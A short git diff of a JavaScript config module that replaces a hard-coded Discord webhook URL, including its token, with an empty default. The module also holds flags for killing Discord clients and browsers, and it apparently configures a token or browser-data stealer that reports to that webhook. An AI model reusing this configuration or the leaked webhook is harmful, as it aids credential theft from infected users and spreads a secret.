@@ -3,7 +3,7 @@ const process = require("process");
 
 module.exports = function getconfig() {
     return {
-        "webhook": process.env.WEBHOOK || "https://discord.com/api/webhooks/1194647161565102120/-rlCBID5UaWfQMkKu-LUHK-zGDiPlY7-sSmGu9FbMc3dFDPKLk8u2QA7or77tHxkBBoG",
+        "webhook": process.env.WEBHOOK || "",
         "kill":{ 
             "discords": false,
             "browsers": true,
